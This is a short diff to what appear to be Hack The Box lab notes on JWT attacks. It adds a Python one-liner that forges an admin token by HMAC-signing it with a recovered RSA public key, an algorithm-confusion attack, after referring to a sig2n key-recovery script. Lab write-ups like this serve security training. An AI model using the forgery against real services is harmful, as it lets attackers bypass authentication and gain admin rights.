@@ -63,7 +63,19 @@
     docker run -it sig2n /bin/bash
     python3 jwt_forgery.py 'JWT_1' 'JWT_2' 'JWT_3'
     ```
-    
+    python3 -c "
+import hmac, hashlib, base64, json
+
+header = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=')
+payload = base64.urlsafe_b64encode(json.dumps({'user':'htb-stdnt','isAdmin':True,'exp':1776873353}).encode()).rstrip(b'=')
+
+with open('b1969268f0e66b1c_65537_x509.pem', 'rb') as f:
+    key = f.read()
+
+msg = header + b'.' + payload
+sig = base64.urlsafe_b64encode(hmac.new(key, msg, hashlib.sha256).digest()).rstrip(b'=')
+print((msg + b'.' + sig).decode())
+"
 - **Sign:** Take the resulting `*509.pem` and use **CyberChef (JWT Sign)** to sign your forged payload.
     
 
